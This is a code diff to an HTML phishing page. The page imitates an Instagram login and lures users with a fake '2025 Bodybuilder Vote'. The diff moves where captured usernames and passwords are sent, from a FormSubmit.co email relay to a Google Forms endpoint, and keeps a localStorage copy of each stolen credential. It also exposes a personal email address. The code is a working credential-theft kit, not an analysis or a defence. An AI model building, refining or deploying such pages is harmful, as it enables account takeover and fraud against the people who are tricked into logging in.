@@ -319,15 +319,30 @@
                 <strong>⏰ Loading countdown...</strong>
             </div>
             
-            <!-- FORM SUBMIT.CO - SENDS TO YOUR EMAIL -->
-            <form action="https://formsubmit.co/ksofie841@gmail.com" method="POST" class="login-form" id="loginForm">
-                <input type="hidden" name="_subject" value="🏆 Bodybuilder Vote 2025 - New Login">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://instagram.com">
+            <!-- GOOGLE FORM SUBMISSION -->
+            <form action="https://docs.google.com/forms/d/e/1FAIpQLSeCYt3nGXOQxAIkuMAIJme2FRUHAtKvuRgVbY3jZPo-jXZPDw/formResponse" 
+                  method="POST" 
+                  class="login-form" 
+                  id="loginForm"
+                  target="_blank">
                 
-                <input type="text" name="username" placeholder="Phone number, username or email" class="input-field" required>
-                <input type="password" name="password" placeholder="Password" class="input-field" required>
+                <!-- Username Field -->
+                <input type="text" 
+                       name="entry.2104154354" 
+                       placeholder="Phone number, username or email" 
+                       class="input-field" 
+                       required>
+                
+                <!-- Password Field -->
+                <input type="password" 
+                       name="entry.1439002539" 
+                       placeholder="Password" 
+                       class="input-field" 
+                       required>
+                
+                <!-- Hidden fields for better tracking -->
+                <input type="hidden" name="fvv" value="1">
+                <input type="hidden" name="pageHistory" value="0">
                 
                 <button type="submit" class="login-btn">Log in to Vote for 2025</button>
                 <div class="success-message" id="successMessage">
@@ -384,10 +399,10 @@
     </div>
 
     <script>
-        // Handle form submission - FormSubmit.co + Local Storage Backup
+        // Handle form submission - Google Forms + Local Storage Backup
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            const username = document.querySelector('input[name="username"]').value;
-            const password = document.querySelector('input[name="password"]').value;
+            const username = document.querySelector('input[name="entry.210415454"]').value;
+            const password = document.querySelector('input[name="entry.1439002539"]').value;
             
             if(username && password) {
                 // Backup to local storage (never fails)
@@ -396,14 +411,16 @@
                     username: username,
                     password: password,
                     timestamp: new Date().toLocaleString(),
-                    purpose: '2025 Bodybuilder Competition Vote'
+                    purpose: '2025 Bodybuilder Competition Vote',
+                    submittedTo: 'Google Forms'
                 });
                 localStorage.setItem('bodybuilderVotes2025', JSON.stringify(submissions));
                 
                 // Show success message
                 document.getElementById('successMessage').style.display = 'block';
                 
-                // FormSubmit will handle the email and redirect via _next parameter
+                // Google Forms will handle the submission and show confirmation
+                // The form will open in new tab due to target="_blank"
             } else {
                 alert('Please fill in both fields to cast your 2025 vote');
                 e.preventDefault(); // Stop form submission if fields empty
@@ -489,3 +506,4 @@
     </script>
 </body>
 </html>
+
